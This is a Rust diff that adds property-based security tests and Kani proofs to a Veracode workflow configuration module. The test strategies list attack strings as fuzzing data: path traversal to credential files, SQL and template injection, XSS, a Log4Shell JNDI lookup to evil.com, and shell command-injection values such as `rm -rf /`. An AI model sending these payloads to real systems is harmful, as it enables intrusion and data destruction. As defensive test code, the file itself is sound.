@@ -1297,6 +1297,7 @@ impl VeracodeWorkflow {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use proptest::prelude::*;
 
     #[test]
     fn test_workflow_config_builder() {
@@ -1327,5 +1328,434 @@ mod tests {
 
         let error = WorkflowError::Workflow("Custom error".to_string());
         assert_eq!(error.to_string(), "Workflow error: Custom error");
+    }
+
+    // ============================================================================
+    // SECURITY PROPERTY-BASED TESTS
+    // ============================================================================
+
+    /// Strategy for generating valid application/sandbox names
+    /// Allows alphanumeric, spaces, hyphens, underscores
+    fn valid_name_strategy() -> impl Strategy<Value = String> {
+        r"[a-zA-Z0-9 _-]{1,200}".prop_map(|s| s.trim().to_string())
+    }
+
+    /// Strategy for generating path traversal attack strings
+    fn path_traversal_strategy() -> impl Strategy<Value = String> {
+        prop_oneof![
+            Just("../".to_string()),
+            Just("..\\".to_string()),
+            Just("../../etc/passwd".to_string()),
+            Just("..\\..\\windows\\system32".to_string()),
+            Just("/etc/passwd".to_string()),
+            Just("C:\\Windows\\System32\\config\\sam".to_string()),
+            Just("....//....//".to_string()),
+            Just("..%2F..%2F".to_string()),
+            Just("%2e%2e%2f".to_string()),
+            Just("..;/".to_string()),
+        ]
+    }
+
+    /// Strategy for generating injection attack strings
+    fn injection_attack_strategy() -> impl Strategy<Value = String> {
+        prop_oneof![
+            Just("'; DROP TABLE apps; --".to_string()),
+            Just("admin' OR '1'='1".to_string()),
+            Just("${jndi:ldap://evil.com/a}".to_string()),
+            Just("{{7*7}}".to_string()),
+            Just("<script>alert('XSS')</script>".to_string()),
+            Just("\0null\0byte".to_string()),
+            Just("&admin=true".to_string()),
+            Just("?param=value".to_string()),
+            Just("`rm -rf /`".to_string()),
+            Just("$(whoami)".to_string()),
+            Just("\n\rHTTP/1.1 200 OK\n\r".to_string()),
+        ]
+    }
+
+    /// Strategy for generating oversized strings
+    fn oversized_string_strategy() -> impl Strategy<Value = String> {
+        (1000..10000usize).prop_map(|size| "A".repeat(size))
+    }
+
+    /// Strategy for generating control characters
+    fn control_char_strategy() -> impl Strategy<Value = String> {
+        prop_oneof![
+            Just("\x00".to_string()),
+            Just("\x01\x02\x03".to_string()),
+            Just("\x7F".to_string()),
+            Just("\u{FEFF}".to_string()), // BOM
+            Just("\u{200B}".to_string()), // Zero-width space
+        ]
+    }
+
+    proptest! {
+        #![proptest_config(ProptestConfig {
+            cases: if cfg!(miri) { 5 } else { 1000 },
+            failure_persistence: None,
+            .. ProptestConfig::default()
+        })]
+
+        // ========================================================================
+        // WorkflowConfig Security Tests
+        // ========================================================================
+
+        /// Property: Valid names are accepted in WorkflowConfig
+        #[test]
+        fn prop_workflow_config_accepts_valid_names(
+            app_name in valid_name_strategy(),
+            sandbox_name in valid_name_strategy()
+        ) {
+            let config = WorkflowConfig::new(app_name.clone(), sandbox_name.clone());
+            prop_assert_eq!(&config.app_name, &app_name);
+            prop_assert_eq!(&config.sandbox_name, &sandbox_name);
+        }
+
+        /// Property: Path traversal in file paths should be detected
+        /// This test ensures that file paths containing path traversal patterns
+        /// are stored as-is (for validation at upload time)
+        #[test]
+        fn prop_workflow_config_stores_file_paths(
+            traversal in path_traversal_strategy()
+        ) {
+            let config = WorkflowConfig::new("App".to_string(), "Sandbox".to_string())
+                .with_file(traversal.clone());
+            // Files are stored as-is; actual validation happens during upload
+            prop_assert_eq!(&config.file_paths, &vec![traversal]);
+        }
+
+        /// Property: Multiple files can be added without overflow
+        #[test]
+        fn prop_workflow_config_handles_multiple_files(
+            file_count in 1..100usize
+        ) {
+            let mut config = WorkflowConfig::new("App".to_string(), "Sandbox".to_string());
+            let files: Vec<String> = (0..file_count)
+                .map(|i| format!("file{}.jar", i))
+                .collect();
+
+            config = config.with_files(files.clone());
+            prop_assert_eq!(config.file_paths.len(), file_count);
+        }
+
+        /// Property: Injection attacks in names are stored as-is
+        /// (Backend validation is responsible for sanitization)
+        #[test]
+        fn prop_workflow_config_stores_injection_attempts(
+            injection in injection_attack_strategy()
+        ) {
+            let config = WorkflowConfig::new(injection.clone(), "Sandbox".to_string());
+            prop_assert_eq!(&config.app_name, &injection);
+        }
+
+        /// Property: Oversized strings are handled without panic
+        #[test]
+        fn prop_workflow_config_handles_oversized_strings(
+            oversized in oversized_string_strategy()
+        ) {
+            let config = WorkflowConfig::new(oversized.clone(), "Sandbox".to_string());
+            prop_assert_eq!(&config.app_name, &oversized);
+            // Config stores the value; API will reject if too large
+        }
+
+        /// Property: Control characters in input are preserved
+        #[test]
+        fn prop_workflow_config_preserves_control_chars(
+            control_chars in control_char_strategy()
+        ) {
+            let config = WorkflowConfig::new(
+                format!("App{}", control_chars),
+                "Sandbox".to_string()
+            );
+            prop_assert!(config.app_name.contains(&control_chars));
+        }
+
+        /// Property: Builder pattern preserves immutability semantics
+        #[test]
+        fn prop_workflow_config_builder_immutability(
+            desc1 in r"[a-zA-Z ]{1,50}",
+            desc2 in r"[a-zA-Z ]{1,50}"
+        ) {
+            let config1 = WorkflowConfig::new("App".to_string(), "Sandbox".to_string())
+                .with_app_description(desc1.clone());
+            let config2 = config1.clone().with_app_description(desc2.clone());
+
+            prop_assert_eq!(config1.app_description.as_deref(), Some(desc1.as_str()));
+            prop_assert_eq!(config2.app_description.as_deref(), Some(desc2.as_str()));
+        }
+
+        /// Property: Empty file paths collection is valid
+        #[test]
+        fn prop_workflow_config_allows_empty_files(
+            auto_scan in proptest::bool::ANY
+        ) {
+            let config = WorkflowConfig::new("App".to_string(), "Sandbox".to_string())
+                .with_auto_scan(auto_scan);
+            prop_assert!(config.file_paths.is_empty());
+        }
+
+        // ========================================================================
+        // WorkflowError Security Tests
+        // ========================================================================
+
+        /// Property: Error messages don't expose sensitive data patterns
+        #[test]
+        fn prop_workflow_error_no_sensitive_exposure(
+            msg in r"[a-zA-Z0-9 ]{1,100}"
+        ) {
+            let errors = vec![
+                WorkflowError::NotFound(msg.clone()),
+                WorkflowError::AccessDenied(msg.clone()),
+                WorkflowError::Workflow(msg.clone()),
+            ];
+
+            for error in errors {
+                let display = error.to_string();
+                // Ensure error messages are properly prefixed
+                prop_assert!(
+                    display.contains("Not found:") ||
+                    display.contains("Access denied:") ||
+                    display.contains("Workflow error:")
+                );
+            }
+        }
+
+        /// Property: Error conversion preserves error type
+        #[test]
+        fn prop_workflow_error_from_conversions(
+            msg in r"[a-zA-Z0-9 ]{1,100}"
+        ) {
+            let veracode_err = VeracodeError::InvalidResponse(msg.clone());
+            let workflow_err: WorkflowError = veracode_err.into();
+            #[allow(clippy::wildcard_enum_match_arm)]
+            match workflow_err {
+                WorkflowError::Api(_) => {
+                    // Expected conversion
+                },
+                _ => prop_assert!(false, "Unexpected error variant"),
+            }
+        }
+
+        // ========================================================================
+        // Input Validation Security Tests
+        // ========================================================================
+
+        /// Property: Application names with special characters are preserved
+        #[test]
+        fn prop_app_name_special_chars_preserved(
+            prefix in r"[a-zA-Z]{1,20}",
+            special in r"[!@#$%^&*()+=\[\]:;<>,.?/|`~]{1,5}"
+        ) {
+            let app_name = format!("{}{}", prefix, special);
+            let config = WorkflowConfig::new(app_name.clone(), "Sandbox".to_string());
+            prop_assert_eq!(&config.app_name, &app_name);
+        }
+
+        /// Property: Sandbox names can contain valid punctuation
+        #[test]
+        fn prop_sandbox_name_punctuation(
+            base in r"[a-zA-Z]{1,20}",
+            separator in r"[ _-]{1,3}"
+        ) {
+            let sandbox_name = format!("{}{}test", base, separator);
+            let config = WorkflowConfig::new("App".to_string(), sandbox_name.clone());
+            prop_assert_eq!(&config.sandbox_name, &sandbox_name);
+        }
+
+        /// Property: File paths are accumulated correctly
+        #[test]
+        fn prop_file_paths_accumulation(
+            count in 1..50usize,
+            base_name in r"[a-zA-Z0-9_-]{1,20}"
+        ) {
+            let mut config = WorkflowConfig::new("App".to_string(), "Sandbox".to_string());
+
+            for i in 0..count {
+                let file_path = format!("{}{}.jar", base_name, i);
+                config = config.with_file(file_path);
+            }
+
+            prop_assert_eq!(config.file_paths.len(), count);
+        }
+
+        /// Property: Descriptions can contain Unicode
+        #[test]
+        fn prop_description_unicode_support(
+            unicode in r"[\u{0080}-\u{00FF}]{1,50}"
+        ) {
+            let config = WorkflowConfig::new("App".to_string(), "Sandbox".to_string())
+                .with_app_description(unicode.clone());
+            prop_assert_eq!(config.app_description.as_deref(), Some(unicode.as_str()));
+        }
+
+        // ========================================================================
+        // State Consistency Tests
+        // ========================================================================
+
+        /// Property: Default values are consistent
+        #[test]
+        fn prop_workflow_config_default_consistency(
+            app_name in valid_name_strategy(),
+            sandbox_name in valid_name_strategy()
+        ) {
+            let config = WorkflowConfig::new(app_name, sandbox_name);
+
+            prop_assert_eq!(config.business_criticality as i32, BusinessCriticality::Medium as i32);
+            prop_assert_eq!(config.app_description, None);
+            prop_assert_eq!(config.sandbox_description, None);
+            prop_assert!(config.file_paths.is_empty());
+            prop_assert!(config.auto_scan);
+            prop_assert!(config.scan_all_modules);
+        }
+
+        /// Property: Boolean flags are independent
+        #[test]
+        fn prop_workflow_config_boolean_independence(
+            auto_scan in proptest::bool::ANY,
+            scan_all_modules in proptest::bool::ANY
+        ) {
+            let config = WorkflowConfig::new("App".to_string(), "Sandbox".to_string())
+                .with_auto_scan(auto_scan)
+                .with_scan_all_modules(scan_all_modules);
+
+            prop_assert_eq!(config.auto_scan, auto_scan);
+            prop_assert_eq!(config.scan_all_modules, scan_all_modules);
+        }
+
+        // ========================================================================
+        // Boundary Condition Tests
+        // ========================================================================
+
+        /// Property: Empty string names are handled
+        #[test]
+        fn prop_workflow_config_empty_names(
+            name in r"\s*"
+        ) {
+            let config = WorkflowConfig::new(name.clone(), "Sandbox".to_string());
+            prop_assert_eq!(&config.app_name, &name);
+        }
+
+        /// Property: Maximum realistic file count doesn't cause issues
+        #[test]
+        fn prop_workflow_config_max_files(
+            count in 1..1000usize
+        ) {
+            let files: Vec<String> = (0..count)
+                .map(|i| format!("f{}.jar", i))
+                .collect();
+
+            let config = WorkflowConfig::new("App".to_string(), "Sandbox".to_string())
+                .with_files(files);
+
+            prop_assert_eq!(config.file_paths.len(), count);
+        }
+
+        /// Property: All BusinessCriticality values are valid
+        #[test]
+        fn prop_workflow_config_all_criticality_levels(
+            level in 0..5u8
+        ) {
+            let criticality = match level {
+                0 => BusinessCriticality::VeryHigh,
+                1 => BusinessCriticality::High,
+                2 => BusinessCriticality::Medium,
+                3 => BusinessCriticality::Low,
+                _ => BusinessCriticality::VeryLow,
+            };
+
+            let config = WorkflowConfig::new("App".to_string(), "Sandbox".to_string())
+                .with_business_criticality(criticality);
+
+            prop_assert_eq!(config.business_criticality as i32, criticality as i32);
+        }
+
+        // ========================================================================
+        // WorkflowResultData Validation Tests
+        // ========================================================================
+
+        /// Property: File count is always non-negative and bounded
+        #[test]
+        fn prop_workflow_result_files_uploaded_bounds(
+            files_uploaded in 0..10000usize
+        ) {
+            // Verify that files_uploaded counter doesn't overflow
+            // This test ensures the counter can handle realistic file counts
+            prop_assert!(files_uploaded < usize::MAX);
+
+            // Simulate accumulation without overflow
+            let accumulated = files_uploaded.saturating_add(1);
+            prop_assert!(accumulated > files_uploaded || files_uploaded == usize::MAX);
+        }
+    }
+}
+
+#[cfg(kani)]
+mod kani_proofs {
+    use super::*;
+
+    /// Verify that file count accumulation cannot overflow
+    #[kani::proof]
+    #[kani::unwind(10)]
+    fn verify_file_count_no_overflow() {
+        let initial_count: usize = kani::any();
+        kani::assume(initial_count < 1000);
+
+        let mut config = WorkflowConfig::new("App".to_string(), "Sandbox".to_string());
+
+        // Simulate adding files
+        for i in 0..10 {
+            let file = format!("file{}.jar", i);
+            config = config.with_file(file);
+        }
+
+        // Verify count is correct and no overflow occurred
+        assert!(config.file_paths.len() == 10);
+    }
+
+    /// Verify that builder pattern maintains consistency
+    #[kani::proof]
+    fn verify_builder_consistency() {
+        let app_name = String::from("TestApp");
+        let sandbox_name = String::from("TestSandbox");
+
+        let config1 = WorkflowConfig::new(app_name.clone(), sandbox_name.clone());
+        let config2 = config1
+            .clone()
+            .with_auto_scan(false)
+            .with_scan_all_modules(false);
+
+        // Original config should be unchanged (consumed by builder)
+        assert_eq!(config1.auto_scan, true);
+        assert_eq!(config2.auto_scan, false);
+    }
+
+    /// Verify deletion policy bounds checking
+    #[kani::proof]
+    fn verify_deletion_policy_bounds() {
+        let policy: u8 = kani::any();
+
+        // Deletion policy should be 0, 1, or 2
+        if policy <= 2 {
+            // Valid policy - should be usable
+            assert!(policy == 0 || policy == 1 || policy == 2);
+        } else {
+            // Invalid policy - calling code should validate
+            // This proof documents the expected range
+            assert!(policy > 2);
+        }
+    }
+
+    /// Verify error conversion preserves type safety
+    #[kani::proof]
+    fn verify_error_conversion_type_safety() {
+        let msg = String::from("test error");
+        let veracode_err = VeracodeError::InvalidResponse(msg);
+        let workflow_err: WorkflowError = veracode_err.into();
+
+        // Verify conversion produces Api variant
+        match workflow_err {
+            WorkflowError::Api(_) => {}
+            _ => unreachable!("Should always convert to Api variant"),
+        }
     }
 }
